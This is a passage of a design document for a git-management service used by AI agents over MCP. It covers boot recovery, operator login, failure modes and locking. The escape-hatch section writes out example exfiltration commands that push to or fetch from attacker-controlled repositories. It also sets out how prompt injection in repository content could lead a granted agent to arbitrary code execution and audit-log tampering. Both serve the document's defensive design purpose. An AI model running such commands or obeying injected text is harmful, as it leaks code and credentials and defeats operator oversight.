   is not true**: a bind-mounted host path, where advisory locking has historically been unreliable
   enough that two instances can both believe they hold the lease. The storage volume must be a
   container-managed named volume for that reason, and the child-process test is what turns a
   volume that does not honour the lock into a refusal instead of silent dual ownership.

   **A held lock can also be lost while the process is alive and healthy**, which is a second way
   to reach dual ownership and is not a variant of the case above. The lock lives in the OS, but
   it survives only as long as the handle holding it stays open — and a handle the language runtime
   considers unreachable may be finalised at any time, closing it and releasing the lock under a
   process that goes on believing it owns the volume. No kill is involved, nothing is logged, and
   the self-test above has long since passed. The mitigation is that **the handle is held for the
   process's lifetime by construction**, from module scope, rather than being reachable only
   through whatever object acquisition happened to return. This is stated here because anyone
   reimplementing the lease from the boot sequence alone would otherwise reintroduce it, and
   because it is invisible to any test whose process exits promptly — see `90-decisions.md`.
2. Load the generated registry, verify its fingerprint, verify the console asset manifest. A
   mismatch is fatal — the service must never start with a smaller accidental tool set.
3. Verify the deployment ceiling names only capabilities in the contract set. Verify every
   registry operation has exactly one executor.
4. Open the structured store; take the pre-migration copy, then run forward-only migrations.
5. **If no operator credential exists, note that provisioning is pending.** Readiness still
   passes: it reports whether the service can serve, not whether an operator exists yet, and
   failing it would withhold traffic from the very enrolment route that resolves the condition.
   Every console route answers `401` except enrolment, which requires the secret carried in the
   provisioning file. See Operator identity.
6. **Resolve every job left `running` by the previous process, before anything else touches the
   scheduler** — from the journal alone, running no resume steps. A job that reached `running`
   dispatched, and the pipeline stamped its `scheduledJobId` onto the journal entry it created, so
   the entry is findable by querying on the job id. An entry recovery can settle makes the job
   `done`; one that parks as `attention` makes the job `needs-attention` with the same reason; and
   a job with no entry at all never dispatched and returns to `pending`. **A `running` job is
   never simply fired again** — its side effect may have been a push, a pull request or a merge,
   and re-running blind is how a scheduled operation becomes a duplicate one.

   **This step classifies; it never resumes.** Running a resume step here would put a domain
   mutation before the transports start, and a composite's resume can touch the host — which
   would make boot depend on host reachability and a live credential, the exact cost for which
   probing the host during recovery was rejected. Any entry needing a resume is left for the lazy
   pass, and its job simply stays `running` until that happens, which is a state the console
   shows rather than one that silently fires.
7. **Re-validate every pending scheduled job — and every unsettled journal entry — against the
   registry and catalogue just loaded.** An image upgrade can rename a tool, remove one, or change
   its input schema while jobs referencing the old shape sit pending; without this sweep the
   failure surfaces weeks later at fire time, with its cause an upgrade nobody is still thinking
   about. A job whose tool no longer exists, or whose stored input no longer validates, becomes
   `needs-attention` with the reason naming the upgrade.

   The same upgrade can remove the **recovery descriptor** an unsettled entry depends on, and the
   sweep catches that too: an entry whose tool has no descriptor in the new catalogue is parked as
   `attention` here rather than falling into a lookup the recovery ladder has no branch for. Both
   are store queries rather than git work, so the sweep costs nothing against lazy recovery, and
   the operator sees both next to the fingerprint checks that caused them rather than at 03:00.
8. Re-derive every clone's state from disk. The stored value is a report, not a source of truth.
9. **Readiness passes and transports start**, before any recovery work runs. Recovery is
   per-declaration and lazy: a declaration with unsettled journal entries is marked
   `recovery-pending` and recovers on first use or on a background sweep, whichever comes first,
   and refuses mutations until it has. Eager recovery across every declaration would make restart
   cost scale with estate size — minutes of total unavailability at a few hundred clones, to
   recover state concerning at most one of them — which would make operators avoid the restart
   that definition-of-done item 14 exists to make safe.
10. **The recovery pass itself, per declaration, before that declaration serves a mutation.** For
    each journal entry not `settled`, re-derive actual state and compare it against `preState` and
    against the expected post-state from the entry's **recovery descriptor**, looked up in the
    catalogue by tool name:
    - pre-state matches **and no step is `applied`** — nothing happened; mark `settled`. Both
      conditions are load-bearing: a push or a pull request the remote accepted leaves every local
      field untouched, so pre-state alone would settle a completed remote mutation as a non-event;
    - expected post-state matches — it completed and only the settle was lost; mark `settled`,
      **and fire the notifier if the operation reached a terminal state the caller never saw.**
      The caller's connection died with the process; the notification is the only thing that can
      still reach them, and suppressing it here recreates "unwatched means unnoticed" inside the
      recovery path;
    - no descriptor is found at all — park as `attention`. The boot sweep should have caught this,
      and this is the backstop for an entry written between the sweep and now;
    - neither — the descriptor either declares a resume step or it does not. If it does, run it
      **as an ordinary operation through the pipeline, taking the global mutation lock for
      itself**, never nested inside a triggering caller's lock: recovery-on-first-use runs to
      completion *before* the triggering call acquires anything, so a non-reentrant mutex is never
      re-entered and two mutations are never in flight. Then re-classify. If there is no resume
      step, mark the entry `attention`, put the clone in
      `needs-attention`, block ordinary mutations against that declaration, report it in status,
      and notify at `attention` severity. The operator's route back out is the parked-operations
      view under `attention.resolve`, including the repair session that view now carries; without
      it the only exit is host access.

Recovery never discards work to reach a clean state. "Recovers" here means the interruption is
deterministically classified and either resumed or safely parked — never rolled back by
throwing away a commit, because the standing refusal against discarding uncommitted or unpushed
work outranks tidiness.

**Per-session stdio processes own no state.** A stdio process is a thin transport that proxies
to the always-on instance over its HTTP surface, authenticating as an MCP client. It never opens
the volume, never takes a lock and holds no clone. That is how the two lifecycles the brief
requires stay consistent with each other: there is exactly one owner of storage, and the
short-lived process is not it.

---

## Operator identity and the console session

One operator, no second account to let them back in, TOTP enforced rather than offered, on a
publicly reachable origin. That combination makes three things load-bearing that a multi-user
service would treat as routine.

### First provisioning

Everything below assumes an operator identity already exists. Nothing creates one, and on a
publicly reachable origin the interval between first boot and first enrolment is not a detail to
leave undescribed — it is either an open setup route or a service nobody can log into, and which
one it is should be a decision.

**The first credential is consumed from a provisioning file on the volume**, written by an
operator with host access. The file **carries a secret, and the enrolment route demands it** — its
presence alone authorises nothing. That is the whole difference between a bootstrap and an open
window: on a publicly reachable origin, a route that enrols whoever reaches it first while a file
happens to exist is a race. Enrolment sets the password, enrols the mandatory TOTP factor, shows
the ten recovery codes once, and burns the file.

**Readiness passes while provisioning is pending.** Readiness reports whether the service can
serve, not whether an operator exists yet — and behind the reverse proxy the brief mandates, a
failed readiness is precisely what would withhold traffic from the enrolment route that resolves
the condition. An earlier draft asserted both at once. The service comes up, answers `401` on
every console route except enrolment, and reports in its logs and status endpoint that it is
waiting to be provisioned.

This is the same trust root as break-glass, deliberately: volume access is already the ultimate
authority in this design, so provisioning introduces no new one. **No HTTP route exposing
repository, credential, audit, volume or operator state is ever unauthenticated**, at any point in
the lifecycle — enrolment included, which is what the secret buys and what a token printed to the
logs and exchanged over an open setup route would not.

**The liveness probe is the one exception, and it is an exception because of what it carries rather
than where it sits.** It answers readiness and the running commit, and nothing else: item 15's
companion check polls it before it holds a session, and a reverse proxy needs it to decide whether
to send traffic at all. The operator health report — failing credential references, audit chain
state, volume usage by consumer, parked operation counts — is a **separate authenticated route**,
not the same payload. An earlier reading had them as one, which would have put an inventory of
declaration ids, credential reference names, whether audit tampering had been detected, and current
disk pressure on an unauthenticated endpoint of a publicly reachable origin. The rule above is
about the data, so splitting the payload is what satisfies it rather than what evades it.

### Lockout recovery

Definition-of-done item 10 requires a working path, and there are two, deliberately independent
of each other and of the identity provider.

- **Recovery codes.** Ten single-use codes generated at first enrolment, displayed exactly once,
  stored only as hashes. Using one authenticates, burns the code, writes an audit line, and
  forces TOTP re-enrolment. They work while the identity provider is down, because they are
  local.
- **Break-glass.** A short-lived single-use token an operator with host access writes into the
  volume, consumed at the next login and audited. This is the path for a lost TOTP device *and*
  lost recovery codes, and it is the reason volume access is the ultimate authority rather than
  re-provisioning the instance.

The case worth naming, because the failure-mode table's answer to a broken identity provider is
"local password plus TOTP still works": that answer is no help when TOTP is precisely what was
lost. Recovery codes cover an unavailable provider, break-glass covers a lost second factor, and
neither depends on the other. No path requires the identity provider to restore local access, and
no path requires a working TOTP device to burn a recovery code.

### Console session

The console is an ambient-authority browser session driving routes that mutate repositories, so
its lifecycle is part of the security design rather than a framework default.

- **Cookie:** `HttpOnly`, `Secure`, `SameSite=Lax`, host-scoped, no subdomain sharing.
- **CSRF:** an `Origin` check plus a double-submit token on every mutating route. The API is an
  explicit route table over repository mutations; without this, a cross-site request from any page
  the operator happens to have open reaches those routes with the operator's own session.
- **Lifetime:** an idle timeout and a longer absolute lifetime, both configurable, plus an
  explicit logout that invalidates server-side rather than only clearing the cookie. Both live on
  the persisted `OperatorSession` row, which is what makes invalidation a fact rather than a
  gesture, and what lets a console session survive a restart on the same reasoning that made
  OAuth grants durable.
- **Visibility:** operator sessions appear in the same grants view as MCP sessions and operator
  API tokens, and are revocable there, so "revoke everything and re-authenticate" is one screen
  during an incident.

---

## Failure modes

### External dependencies

| Dependency | What fails | Detected by | System does | Caller sees | State left behind |
|---|---|---|---|---|---|
| **Remote git host** | Unreachable, DNS, TLS | Non-zero exit from a bounded `git` invocation (clone capped at 300 s) | No retry inside the call | `upstream` | Initial clone: partial directory removed, clone `absent`. Fetch: refs unchanged, since git updates refs atomically. |
| | Auth rejected | Exit code plus scrubbed stderr | Marks the reference failing **for that declaration only** — keyed `(credentialRef, declarationId)`, never the reference alone. A token can be valid for repository A and unauthorised for B, and a reference-wide mark would take A out of service because of B's permissions, turning one repository's misconfiguration into an unrelated outage. Never retries with a different credential. The mark clears when the resolver observes a changed secret, or by hand from the health view, so a rotated token needs no restart | `upstream`, naming the reference and the declaration, never the secret | Unchanged |
| | Clone timeout | The 300 s cap | Removes the partial directory under the materialisation lock | `timeout` | `absent` |
| | Base diverged from local | Ancestry check in branch preparation | Reports; changes nothing | `precondition` naming both SHAs | Unchanged; every commit still reachable |
| **GitHub via `gh`** | Rate limit | Response headers and exit code | Trips the per-credential budget; monitoring waits back off with jitter | `upstream` with a retry-after. A rate limit is a declared external service declining to serve, which the generating rule classifies as `isError: true`; calling it `precondition` said the repository was in a state that prevented the operation, which is false and lets a caller treat an unavailable dependency as a normal gate | Unchanged |
| | 5xx or transport error | Exit code | Up to three retries with backoff, **read operations only** | `upstream` after exhaustion | Unchanged |
| | Merge conflict | PR state | **Terminal.** No rebase tool exists and by design never will | `precondition` naming the branch and both heads | Branch and commits intact; notifier fires |
| | Required check failed | Check status | Terminal for the operation | `precondition` | PR open, nothing merged; notifier fires |
| **Filesystem / volume** | Disk full | Watermark check before clone and after each mutation | Requests a maintenance pass — **never evicts inline**, which would take a materialisation lock after a mutation lock. The pass applies each module's retention and evicts safe clones; if nothing is safe to release, the operation that needed the space is refused | `precondition` naming which of the five consumers is taking the volume, with the store broken down by table, and, when clones are the cause, the declarations blocking eviction | Nothing deleted beyond retention. **The service never deletes repository work to make room.** |
| | Corrupt clone | `rev-parse --git-dir` fails at materialisation | Refuses; does not clone over it | `precondition` naming `clone.remove` with its override as the exit, since the safe-to-evict predicate cannot be computed on a tree git will not read, and without an exit the declaration is blocked and the disk unreclaimable for the life of the instance | Directory untouched |
| | Permission denied | Syscall error | Fatal at boot; `infrastructure` at runtime | `infrastructure` | Unchanged |
| **Structured store** | Locked or busy | SQLite busy | Bounded retry with backoff | `infrastructure` after exhaustion | Transaction rolled back |
| | Corrupt | Integrity check at boot | **Refuses to start**, naming the newest daily snapshot **and its age**, alongside the pre-migration copy. The two are for different failures: the pre-migration copy is a rollback target for a bad image and can be months old, so offering it as the answer to corruption would silently propose reverting every declaration, grant and journal entry written since the last upgrade | No service | Volume untouched; the audit log is still readable, which is why it does not live in this store |
| | Migration fails | Non-zero from the migration step | Refuses to start; the backup was taken first | No service | The backup is the rollback target for item 18 |
| **Identity provider** | Unreachable, key rotation, clock skew | Discovery or JWKS fetch failure; signature or validity-window failure | Federated login fails; **local password plus TOTP still works** | `401` with a reason | No session |
| **Deploy target** (a managed repository's published URL) | Unreachable or non-2xx | HTTP status from the http adapter | No retry inside the call | `upstream` | Unchanged |
| | 200, but serving a commit other than the expected merge commit | Explicit check of the served commit against the expected SHA | Polls to the 1800 s cap | `precondition` naming both SHAs | Unchanged. **No code path returns a URL in a success position without a confirmed successful deploy for that exact commit.** |
| **This service's own deployment** (definition-of-done item 15) | Stale or mixed runtime, wrong catalogue, verification credential rejected | The companion check: poll `/healthz` until the commit SHA is stable, then run a real `initialize → tools/list → repo_status` session | Classifies rather than reporting a bare pass | `stale-runtime`, `mixed-runtime`, `verification-credential`, `unexpected-profile-or-catalog`, or `verified`. **Not a registry tool** — an executable check shipped alongside the service, as the brief describes | Unchanged |
| **Notifier endpoint** | Unreachable, non-2xx | HTTP status | Outbox retries with backoff, bounded, then stops retrying and **surfaces the row in the health view and the status endpoint**. It is not dropped: an endpoint down overnight is exactly when the 03:00 merge conflict lands, and a notification that fails silently recreates the unwatched-means-unnoticed failure one level up | Nothing — it never blocks the operation it describes | Outbox row marked failed, retained until the operator clears it |
| **Content drop** (watcher) | Incomplete input — the target tool's schema is not satisfied | Validation before any git action | Moves the file to `failed/` with a sibling `.error.txt`, audits, notifies at `attention` | Nothing — there is no caller | File preserved in `failed/` until the operator clears it. Automatic retention never deletes it |
| | Any later step fails — branch, write, stage, commit, push, PR, auto-merge | The step's own envelope | Same: `failed/` plus the reason, naming which step and what it returned | Nothing | Whatever the completed steps did. A commit may exist and be unpushed, or a PR may be open with auto-merge not enabled — the `.error.txt` says which |
| | A file is still in `processing/` at startup | Directory scan before the first tick | Moves it to `failed/` and **never reprocesses it**, because it may already have an open pull request | Nothing | Untouched; the operator is told to check the host before dropping it again |
| | Symlink dropped into the directory | Link-preserving stat | Ignored — never treated as a candidate file | Nothing | Untouched |
| | Clone is not clean at tick time | Clean check | Skips the whole tick. Fail-safe, not an error | Nothing | Untouched; the drop is picked up on a later tick |
| | Declaration's grant lacks a capability the target tool needs | `authorization` from the dispatch pipeline, like any caller | Moves the file to `failed/` naming the missing capability — a misconfigured declaration, not a transient fault, so it is not retried forever | Nothing | File preserved in `failed/` |
| | Drop lands for a declaration whose clone is `needs-attention` | Clone state | Leaves the file in the inbox and retries on the next tick | Nothing | Inbox grows until the parked entry is resolved, which is visible in the health view |

### Boundaries

| Boundary | What fails | System does | Caller sees | State left behind |
|---|---|---|---|---|
| **Input validation** | Schema mismatch | Rejects before any handler runs | `validation` with findings | None |
| **Scope / capability at dispatch** | Session lacks a capability | Rejects before any handler runs; audits it | `authorization` | None |
| **Global mutation lock** | Held past the acquire timeout | Gives up waiting | `conflict`, naming the holding operation and its repository | None — the queued call never started |
| | Queue depth exceeded | Immediate refusal | `conflict` | None |
| **Materialisation lock** | Another caller is cloning the same declaration | Waits, bounded by the clone timeout | `conflict`, or the successful clone | The clone completes exactly once |
| **Path allowlist** | `-A`, `--all`, `.`, or a path containing `..` or `;` | Rejects outright | `validation` — the input is malformed, and no authority could ever permit it | None |
| | A well-formed path outside the declaration's `writablePathPrefixes`, or inside it but stripped by the acting profile | Rejects outright; **audits it** | `authorization` — insufficient authority, not malformed input, per the envelope's generating rule. This is the refusal that indicates an unattended actor probing its unlock paths, so it takes the audited authority path rather than reading as a caller typo | None |
| **Journal** | Cannot write the intent record | **Aborts the operation before acting.** An unrecoverable mutation is worse than a refused one | `infrastructure` | None |
| **Audit** | Cannot append | Proceeds. Best-effort by design — a logging failure must never fail the call it describes | Nothing | Call completed, line missing |
| | Cannot append the **`git.raw` intent line** | **Aborts before the child process starts.** A hatch use the service cannot record must not run. The claim is refusal at call time only, not that a recorded use stays recorded — see The escape hatch's residual risk | `infrastructure` | None |
| | Cannot append the **`git.raw` outcome line** | Proceeds; the intent line already records the use and its argument vector | The envelope the command produced | Whatever the command did. The trail says what was attempted, not what it achieved |
| **Output validation** | Handler returns something the schema does not admit | Rejects before any structured content reaches the client | `infrastructure` | Side effects already happened; the journal records them |
| **Instance lease** | Second instance, live holder | Refuses to start, naming the holder | No service | Untouched |
| | Lease file present, OS lock free | Takes over, audits the takeover, runs recovery | No service until ready | Recovered per the boot path |
| | Filesystem grants the lock to a second process | Child-process self-test at boot | **Fatal**, naming the volume configuration — this is the bind-mount case, and the alternative is two instances silently sharing one store, journal and set of clones | No service | Untouched |

### Partial failure and retry

Retries happen **only** on operations that are safe to repeat: host reads, store-busy, and
notifier delivery. Nothing that mutates a repository or a pull request is retried automatically,
because a partially applied git sequence retried blind is how work gets stranded — which is the
incident that produced the protected-base invariants in the first place. A mutating operation
that fails leaves a journal entry that is either resumable or parked for the operator; it is
never silently re-run.

Output-validation failure is the one place where the caller sees an error after side effects
landed. The journal records what happened, so the state is inspectable rather than lost.

### The escape hatch's residual risk

`git.raw` runs a fixed executable with an argument vector, never a string, never a shell, with
the working directory pinned to the declaration's clone. That is what keeps it a typed domain
handler rather than the generic shell adapter the non-goals forbid. It is not sufficient on its
own: `git` can be turned into a command executor through configuration and helper options, so
the handler additionally runs with system and global configuration disabled and a neutral home
directory, and rejects argument forms that select an executable or inject configuration.

**The service's own configuration is still supplied, and that is not a loophole but the
mechanism** — see Credential resolution. Git cannot authenticate to a remote from a bare
environment variable, so exec sets the credential channel itself, ahead of any caller argument.
What is excluded is caller-supplied and repository-supplied configuration, not configuration as
such. Stating it the other way round would leave the hatch unable to fetch or push at all, which
is half of what "full git is reachable" means.

**It carries its own timeout, well under the transfer caps.** The argument vector is
caller-authored, so without one the duration of a mutating operation holding the estate-wide
mutation lock would be a caller's choice — and the brief rules out rate limiting on the grounds
that serial mutation already bounds throughput, which bounds the operator's own throughput and
not a caller's ability to choose a slow command. Exceeding the limit kills the child, returns
`timeout`, and parks the journal entry, since what the command achieved before the kill is not
knowable.

**Remote operands are constrained separately, because the non-goal is binding.** The brief
states that a caller can never hand the service a repository URL at call time — both credentials
and remotes come only from operator configuration — and nothing in the rules above touches an
operand. `git fetch https://attacker.example/repo.git` is an ordinary argument vector. Two rules
close it, and both are needed:

- **Any operand that parses as a URL or an scp-style remote must normalise to this declaration's
  own `cloneUrl`**, or the call is rejected as `validation` before the process starts. A
  host-level check is not enough and reads as though it were: `github.com` is necessarily on the
  deployment's allowlist, since every GitHub declaration clones from it, so
  `git push https://github.com/attacker/sink.git` would satisfy a host rule while doing exactly
  what the non-goal forbids — and doing it with the declaration's credential attached. The
  allowlist is the right shape for `cloneUrl` at declaration time, where the question is which
  hosts this deployment may talk to at all; it is the wrong shape for an operand, where the
  question is which *repository*. `git push origin`, `git fetch origin` and an explicit spelling
  of the declaration's own remote all pass. A password-bearing URL is rejected before
  normalisation so discarding its password cannot make it equal to the declaration URL.
- **Remote-valued options are operands too.** An opaque value such as `--remote=sink` is refused;
  the only opaque remote name accepted is `origin`. An explicit URL must pass the same exact
  declaration-URL check as a positional operand.
- **Subcommands that persist a remote are refused outright** — `remote add`, `remote set-url`, and
  `submodule add`. Checking operands alone is defeated by two calls that are individually legal:
  `git remote add sink <url>` followed by `git push sink`, where the second argument vector
  contains no URL at all.
- **Every `git config` write is refused.** Repository-local configuration is the one configuration
  surface the neutral-home rule does not cover, and a write can select an executable, credential
  helper, proxy, transport, URL rewrite or future remote without spelling that effect in the later
  call. Configuration reads remain reachable, except for file, blob, global, system and editor
  forms that read outside the declaration's repository-local configuration or start an editor.

This is enumeration, and enumeration is weaker than construction. It holds for the hatch's
argument vector; it does not hold against code the hatch reaches by other means, which is the
residual risk below.

**This narrows the risk; it does not eliminate it.** A sufficiently determined caller with
`git.raw` can still reach command execution inside the container through git's own extension
points. The brief considered and declined a hard floor no surface can cross, so this is recorded
as known and retained rather than reopened. The mitigations that follow from it are the ones
already in this design: `git.raw` is unregistered for any session whose declaration has not been
granted it, and refuses to run at all if its audit intent line cannot be written.

**The mitigation is per declaration, not per surface.** The deployment ceiling includes `git.raw`
and MCP session profiles do not exclude it, so an agent operating a declaration that has been
granted the hatch sees it in `tools/list` and may call it. The brief settled that when it rejected
restricting the hatch to the console; withholding it from every MCP profile would have been the
console-only rule under another name. What remains is the declaration layer, and it is
default-deny: `capabilityGrant` must name `git.raw` explicitly, and a newly declared repository
does not have it.

That places the whole weight of the prompt-injection property on one decision per repository.
For a declaration without the grant the property is intact and structural — the tool is absent
from the listing, so text embedded in a PR comment cannot talk it into existing. For a declaration
with the grant it is gone, and an agent that reads repository content is one injection away from
arbitrary git in that repository. Granting it is therefore a judgement about a specific
repository's exposure, not a convenience toggle, and it is the single most consequential field in
a declaration.

**What that execution reaches, stated rather than left to be inferred.** The pinned working
directory bounds where `git` operates; it does not confine a child process. Code reached this way
runs as the service, on the volume the service owns, so it can read and write every other
declaration's clone, the structured store, the audit log, and whatever a credential resolver can
resolve. Three consequences follow, and none of them are what the words above appear to promise:

- **Attributability is refusal-time, and tampering is evident rather than prevented.** The
  boundary table claims only that an unrecordable hatch use is refused. Beyond that, the hash
  chain makes truncation and edited lines detectable at boot and in the health view — but
  hatch-reached code runs as the service and can rewrite the log and its mirrored chain head
  together. Detection, not prevention, until the trail leaves the volume.
- **The lattice binds the tool surface, not the process.** "No operation anywhere adds a
  capability to a set" is true of every dispatch path. It is not a claim about a process with
  write access to the grant rows.
- **Per-declaration credential isolation stays a lookup convention.** The brief defers whether it
  is ever an enforced boundary and claims only that a credential is not *given* to an operation
  outside its declaration. Reaching one this way is inside what is claimed, not a departure from
  it. The no-cross-repository non-goal is likewise a scope statement about operations, not a
  containment guarantee — the hatch is authority the operator granted, exercised where it was
  granted.
- **Console authority is reachable, which is the largest of the four and was missing from this
  list.** Break-glass is a file on the volume; recovery-code hashes and operator credentials are
  rows in the store. Code running as the service can write either, and then authenticate at the
  console as the operator — with `declaration.manage`, `auth.manage`, `audit.read` and
  `attention.resolve`. The structural claim made elsewhere in this document, that declaration and
  authorization management are unreachable from MCP because a repository-bound session has nothing
  to bind them to, is a true statement about the **session model** and not about a **process** the
  hatch starts. The enforced TOTP factor of definition-of-done item 10 is not a barrier on this
  path either, since the paths that exist to work around a lost factor are exactly the ones being
  written. Nothing here is a new risk — it is the same accepted code execution, reaching the one
  place the previous enumeration stopped short of naming.

---

## Concurrency and ordering

Two locks, one counter, and a fixed acquisition order.

| Mechanism | Scope | Covers | Held for |
|---|---|---|---|
| **Global mutation mutex** | Process-wide, across every declaration | Working-tree, index, `HEAD` and ref mutations; fetch; pull-request and merge mutations | The whole operation, including its network transfer — see the throughput ceiling below |
| **Per-declaration materialisation mutex** | One declaration | Initial clone, eviction | The whole operation for a **mutating** caller; released at `ready` for reads and waits; up to the 300 s clone cap for a clone |
| **Per-declaration active-operation count** | One declaration | Reads, monitoring waits, and every operation in flight | Not a lock. A non-blocking counter that never makes a caller wait; eviction refuses while it is non-zero |

### The lock protocol

The deadlock argument depends on all five rules, not on the order alone. Stated separately
because four of them are the ones an implementer would otherwise have to invent.

1. **Acquisition order is always materialisation before mutation, never the reverse.**
2. **A mutating caller holds the materialisation lock for the whole operation**, not just for the
   ensure step, and releases in reverse acquisition order. Releasing it early would let eviction
   remove the clone between the ensure and the journal write, producing an intent record for a
   working tree that no longer exists — a state recovery cannot classify, because its pre-state is
   no longer re-derivable. **Reads and monitoring waits release it once the clone is `ready`** and
   are protected from eviction by rule 4 instead; holding it across a bounded wait of up to
   1800 s would serialise every mutation on that repository behind a caller that is only watching.
   This is the one place the two mechanisms divide: the lock orders materialisation against
   mutation, the counter keeps a clone alive while anyone is reading it.
3. **Eviction never runs while the global mutation lock is held.** The disk-pressure watermark
   check after a mutation records the pressure and requests a maintenance pass; the pass runs
   with no mutation lock held and takes materialisation locks in its own right. Without this
   rule the post-mutation check acquires materialisation *after* mutation, which is exactly the
   reverse the order forbids, and the bounded waits would degrade the resulting cycle into
   spurious `conflict`s rather than a visible hang.
4. **Eviction refuses while a declaration's active-operation count is non-zero.** Reads take no
   lock, so nothing else stops eviction deleting a directory a read's subprocess has open. The
   counter is checked on the eviction side precisely because the read side cannot afford to
   block: an evicting pass that finds a non-zero count skips that declaration and moves on.
5. **A recovery resume step is an ordinary operation and takes the mutation lock for itself,
   never inside another operation's hold.** Recovery-on-first-use completes *before* the
   triggering call acquires anything, rather than running nested within it. Both halves matter:
   nested, it would re-enter a promise-chain queue that is not reentrant; unlocked, it would be a
   second repository mutation in flight, breaking the invariant that a crash leaves exactly one
   half-done operation — which is the invariant that makes the journal's classification tractable
   in the first place. The background sweep is subject to the same rule and is simply another
   caller.

With the order fixed over two lock classes and no path that acquires them in reverse, no cycle
can form.

What runs simultaneously:

- **Reads and monitoring waits.** Lock-free. A bounded wait capped at 1800 s must not hold every
  repository for half an hour. They increment the active-operation count, which blocks eviction
  but never blocks another caller.
- **Initial clone of one declaration and mutation of another.** Required by definition-of-done
  item 5. Safe because a clone takes only that declaration's materialisation lock and never the
  global mutation lock, and any operation against the cloning declaration queues behind that same
  materialisation lock. It is **not** safe because the declaration is unservable — under
  clone-on-demand a session names a declaration precisely in order to materialise it. See
  Servability of an unmaterialised declaration.
- **Any number of MCP sessions, the console, the scheduler tick and the watcher.** They contend
  for the same mutation lock and are ordered FIFO by arrival. There is no priority and no
  fairness beyond arrival order.

What must not, and what enforces it:

- **Two mutations against any repository, ever.** The global mutex. Global rather than
  per-repository so a crash leaves exactly one half-done operation, not several.
- **Two clones of the same declaration.** The materialisation mutex.
- **A fetch concurrent with a mutation on the same repository.** Fetch takes the global mutex;
  only the initial clone is exempt, and only because nothing can observe the repository yet.
- **Two instances against one storage volume.** The exclusive advisory OS lock on the lease file.
- **A stdio process racing the always-on container.** Structurally impossible: stdio processes
  own no storage and proxy over HTTP.

Honest limits, stated rather than left to be discovered:

- **A lock-free read can observe a repository mid-mutation.** Every read result carries the
  `operationId` of the last settled mutation and a `mutationInFlight` flag, so a caller can tell
  whether what it read was stable. **The flag is scoped to the declaration being read**, not to
  the mutex: the lock is process-wide, so a flag derived from "is the mutex held" would be true
  whenever any repository in the estate was mutating — always, at the scale where a caller would
  need it, and mostly about repositories the caller is not reading. The holder's `declarationId`
  is known, so the flag answers the question actually being asked. Reads are not made atomic,
  because taking the lock to read reintroduces exactly the blocking the read exemption exists to
  avoid.
- **Lock-free does not mean unbounded, and needs its own admission control.** The mutation mutex
  bounds mutations; nothing bounds reads and monitoring waits, and a 1800 s wait holds a socket,
  a subprocess and memory for half an hour. Without a cap, enough concurrent waits exhaust the
  process and starve the console without breaching any queue limit or rate budget — the service
  stays nominally correct and stops answering. Two caps therefore apply: a per-session limit on
  concurrent monitoring waits, and a process-wide limit on all in-flight lock-free work. Exceeding
  either returns `conflict`, the same kind a full mutation queue returns, because from the
  caller's side it is the same thing: come back later. The values belong with the other
  operational numbers rather than in this document.
- **Throughput is one mutation at a time across the whole estate, and the lock is held across
  network transfers.** Fetch and push take the global mutex and carry their own caps — 300 s
  each, alongside the 300 s clone cap, and `git.raw` carries its own shorter cap because its
  argument vector is caller-authored — so the worst-case hold is a slow transfer, not the
  milliseconds a local commit takes, and not a duration a caller chose. At a hundred declarations with several active callers, a
  one-line commit on an idle repository can queue behind a transfer in flight on any other one,
  and a full queue returns `conflict` on repositories that are themselves doing nothing.
  Accepted rather than fixed: a per-declaration mutation lock would raise throughput and would
  also break the invariant every other part of this design is written against — that a crash
  leaves exactly one half-done operation, which is what makes the journal's recovery
  classification tractable. Revisit only with that invariant reopened.
- **The advisory OS lock protects one host, and only on a filesystem that implements it.** A
  volume bind-mounted from two hosts is not protected — the "no distributed or multi-node
  concurrency" non-goal, restated where it bites. Less obviously, the storage volume **must be a
  container-managed named volume, not a bind mount of a host path**: this is a Linux container on
  a Windows host, and advisory locking over a bind-mounted Windows path has historically been
  unreliable enough that two instances can both believe they hold the lease. Boot therefore
  self-tests the lock **with a real second process** — acquire, spawn a child that must be refused
  the same lock, release — and refuses to start if the filesystem does not honour it, because
  definition-of-done item 9 otherwise fails silently in the configuration a Windows operator is
  most likely to choose. A same-process re-acquire would not test this: whether it succeeds
  depends on the locking call rather than on the filesystem, so it can pass on the broken volume
  and fail on the sound one.
- **Node is single-threaded**, so the mutation mutex only has to serialise await points, not real
  parallel execution. A promise-chain queue is sufficient, as it is in the prior art.

### Servability of an unmaterialised declaration

**A session may name a declaration whose clone does not exist yet.** Definition-of-done item 5
requires onboarding by declaration alone, and clone-on-demand means the `tools/call` *is* the
trigger — so the alternative reading, that nothing is servable until its clone is `ready`, would
leave item 5 with no trigger at all and headless onboarding would fail.

What that costs is one paragraph of analysis the ordering argument used to get for free. Session
establishment, `tools/list` and capability filtering all run against a declaration with no tree,
and all three are well-defined without one, because every input they use is declaration data
rather than repository data: the grant is the four-layer intersection, and none of its layers
reads the working copy. `RepositoryConfig` is the one repository-supplied input, and a missing
config file already defaults every field, so discovery against an unmaterialised declaration
yields the same tool list it will yield once the clone lands.

Three states are therefore distinct and must not be conflated: a declaration with no clone is
**servable and will materialise on first use**; a declaration whose clone is materialising makes
callers wait on its materialisation lock; a declaration in `needs-attention` is servable for
reads and refuses mutations until the parked entry is resolved.

---

## Alternatives considered

**MCP sessions bind to one repository.** Rejected: *a repository-agnostic session with the
repository as a parameter only* — simpler, and it matches the HTTP surface exactly. Rejected
because one `tools/list` would then have to serve every declaration in the session, so
per-repository narrowing could only happen at dispatch. That is strictly weaker than the prior
art's rule that capability filtering affects discovery and dispatch, and it forfeits the property
that carries the actual threat model: a tool absent from the list a client sees cannot be talked
into existing by text embedded in a PR comment. Also rejected: *making the repository field
optional and defaulted from the session binding* — better ergonomics, but the input schema would
then mean different things on different surfaces. The field is required everywhere, and a scoped
session passing the wrong repository gets `authorization`.

**One composed image, one deployment.** Rejected: *a base deployment plus one container per
derived consumer, each with its own console* — cleaner separation of consumer code, and the
reading the layered-image model suggests first. Rejected because it produces two consoles, two
logins and two URLs, which is precisely the "no common place" problem the project exists to
solve, and because it fragments "one instance, many repositories" into one instance per consumer.
The composed image keeps one login, one console, one storage volume and one lock. The cost is
that the blog consumer's authoring tools and views are present in the image for every repository
— paid for by the capability lattice, which withholds them from every declaration whose grant
lacks the corresponding content capabilities.

**Deploy-time locking narrows a build-time maximum.** Rejected: *the contract is compiled per
deployment* — would make the lock exactly what the brief describes, and breaks the fingerprint,
since a contract baked at build cannot enumerate repositories declared later. Also rejected:
*deploy-time configuration widens what the image ships* — the obvious way to make one image serve
differently-privileged deployments, and it destroys default-deny, because the running tool set
would no longer be a subset of the reviewed one. Narrowing-only is what makes both timings true
at once.

